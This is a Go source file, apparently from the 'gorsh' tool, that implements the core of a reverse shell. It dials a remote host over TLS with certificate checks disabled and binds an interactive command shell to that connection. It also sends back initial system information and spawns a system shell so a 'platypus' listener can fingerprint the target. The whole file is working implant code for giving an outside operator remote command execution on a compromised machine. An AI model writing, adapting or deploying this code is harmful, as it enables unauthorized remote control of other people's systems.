package core

import (
	"crypto/tls"
	"fmt"
	"os"

	"git.hyrule.link/blink/gorsh/pkg/cmds"
	"git.hyrule.link/blink/gorsh/pkg/myconn"
	"git.hyrule.link/blink/gorsh/pkg/sitrep"
	"github.com/abiosoft/ishell"
	"github.com/abiosoft/readline"
)

const (
	ErrCouldNotDecode  = 1 << iota
	ErrHostUnreachable = iota
	ErrBadFingerprint  = iota
)

func InitReverseShell(connectString string, fingerprint []byte) {
	config := &tls.Config{InsecureSkipVerify: true}
	var err error
	myconn.Conn, err = tls.Dial("tcp", connectString, config)
	if err != nil {
		os.Exit(ErrHostUnreachable)
	}
	StartShell()
}

func StartShell() {

	hostname, _ := os.Hostname()
	conf := &readline.Config{
		Prompt:      fmt.Sprintf("[%s]> ", hostname),
		Stdin:       myconn.Conn,
		StdinWriter: myconn.Conn,
		Stdout:      myconn.Conn,
		Stderr:      myconn.Conn,
		// VimMode:        true,
		FuncIsTerminal:      func() bool { return true },
		ForceUseInteractive: true,
		// UniqueEditLine:      true,
		// FuncMakeRaw:         func() error { return nil },
		// FuncExitRaw:         func() error { return nil },
	}

	sh := ishell.NewWithConfig(conf)

	cmds.RegisterCommands(sh)
	cmds.RegisterWindowsCommands(sh)
	cmds.RegisterNotWindowsCommands(sh)
	myconn.Send(myconn.Conn, sitrep.InitialInfo())

	// start with an initial system shell to allow
	// platypus to fingerprint; remove otherwise
	cmds.Shell(&ishell.Context{})
	sh.Run()
	os.Exit(0)
}
